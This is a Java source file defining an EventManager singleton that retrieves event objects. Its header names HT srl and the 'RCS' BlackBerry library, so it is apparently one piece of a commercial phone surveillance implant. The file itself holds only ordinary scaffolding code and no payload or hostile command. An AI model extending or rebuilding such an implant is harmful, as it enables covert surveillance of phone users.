/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : EventManager.java
 * Created      : 26-mar-2010
 * *************************************************/

package blackberry;

import java.util.Vector;

import blackberry.event.Event;
import blackberry.interfaces.Singleton;
import blackberry.threadpool.TimerJob;
import blackberry.utils.Check;
import blackberry.utils.Debug;
import blackberry.utils.DebugLevel;

// TODO: Auto-generated Javadoc
/**
 * The Class EventManager.
 */
public final class EventManager extends Manager implements Singleton {

    /** The debug instance. */
    // #debug
    private static Debug debug = new Debug("EventManager", DebugLevel.VERBOSE);

    /** The instance. */
    private static EventManager instance = null;

    /**
     * Gets the single instance of EventManager.
     * 
     * @return single instance of EventManager
     */
    public static synchronized EventManager getInstance() {
        if (instance == null) {
            instance = new EventManager();
        }

        return instance;
    }

    /**
     * Instantiates a new event manager.
     */
    private EventManager() {
        super();
        // #debug debug
        debug.trace("EventManager");
    }

    /*
     * (non-Javadoc)
     * @see blackberry.Manager#getAllItems()
     */
    public Vector getAllItems() {
        final Vector events = statusObj.getEventsList();
        return events;
    }

    /*
     * (non-Javadoc)
     * @see blackberry.Manager#getItem(int)
     */
    public TimerJob getItem(final int id) {
        final Event event = statusObj.getEvent(id);
        // #ifdef DBC
        Check.ensures(event.eventId == id, "Wrong id");
        // #endif
        return event;
    }

}
